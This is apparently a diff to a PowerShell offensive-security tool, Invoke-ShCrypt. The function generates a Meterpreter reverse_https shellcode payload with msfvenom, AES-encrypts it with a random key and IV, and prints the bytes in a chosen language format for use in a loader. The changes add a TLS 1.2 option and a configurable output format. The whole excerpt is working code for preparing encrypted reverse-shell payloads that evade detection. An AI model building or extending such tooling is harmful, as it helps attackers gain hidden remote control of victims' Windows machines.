@@ -96,30 +96,22 @@ function Invoke-ShCrypt {
         [Byte[]]$IV = Get-RandomBytes -Size 16
 
         # msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.X.X LPORT=443 EXITFUNC=thread -f ps1 -v payload
-        [Byte[]] $shellcode = $(Invoke-Expression "msfvenom -p $Payload LHOST=$Lhost LPORT=$Lport EXITFUNC=thread -f ps1 -v payload 2>&1")[-1].replace('[Byte[]] $payload = ', '') -split ','
+        [Byte[]] $shellcode = $(Invoke-Expression "msfvenom -p $Payload SSLVERSION=TLS1.2 LHOST=$Lhost LPORT=$Lport EXITFUNC=thread -f ps1 -v payload 2>&1")[-1].replace('[Byte[]] $payload = ', '') -split ','
     }
     Process {
         # Encrypt
         $encBytes = Encrypt-Bytes -Bytes $shellcode -Key $Key -IV $IV
 
         # Format our byte array into a variable format we can use later
-        $keyStr = Format-ByteArrayToHex -Bytes $key -VarName 'Key' -Format CSharp
-        $ivStr = Format-ByteArrayToHex -Bytes $iv -VarName 'IV' -Format CSharp
-        $rawStr = Format-ByteArrayToHex -Bytes $shellcode -VarName 'Raw' -Format CSharp
-        $encStr = Format-ByteArrayToHex -Bytes $encBytes -VarName 'Encrypted' -Format CSharp
+        $keyStr = Format-ByteArrayToHex -Bytes $key -VarName 'Key' -Format $Format
+        $ivStr = Format-ByteArrayToHex -Bytes $iv -VarName 'IV' -Format $Format
+        $rawStr = Format-ByteArrayToHex -Bytes $shellcode -VarName 'Raw' -Format $Format
+        $encStr = Format-ByteArrayToHex -Bytes $encBytes -VarName 'Encrypted' -Format $Format
     }
     End {
-        Write-Host "[*] Key:"
-        Write-Host $keyStr
-
-        Write-Host "`n[*] IV:"
-        Write-Host $ivStr
-
-        Write-Host "`n[*] Encrypted Bytes"
-        Write-Host $encStr
-
-        Write-Host "`n[*] Raw Bytes:"
+        Write-Host $keyStr `n
+        Write-Host $ivStr `n
+        Write-Host $encStr `n
         Write-Host $rawStr
     }
-
 }
